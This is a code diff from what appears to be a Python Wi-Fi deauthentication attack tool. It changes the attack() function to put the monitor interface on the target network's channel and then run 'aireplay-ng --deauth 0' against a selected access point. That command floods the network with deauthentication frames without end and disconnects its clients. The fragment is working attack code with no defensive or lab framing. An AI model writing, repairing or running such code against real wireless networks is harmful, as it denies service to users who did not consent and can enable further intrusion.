@@ -42,7 +42,9 @@ def select_target():
 
 def attack():
     try:
-        subprocess.run(["iwconfig", MONITOR_INTERFACE, "set", "channel", "1"])
+        subprocess.run(["iwconfig", MONITOR_INTERFACE, "down"], check=True)
+        subprocess.run(["iwconfig", MONITOR_INTERFACE, "channel", wifi_channel], check=True)
+        subprocess.run(["iwconfig", MONITOR_INTERFACE, "up"], check=True)
         subprocess.run(["aireplay-ng", "--deauth", "0", "-a", selected_wifi_mac, MONITOR_INTERFACE])
     except KeyboardInterrupt:
         print("Stopping...")
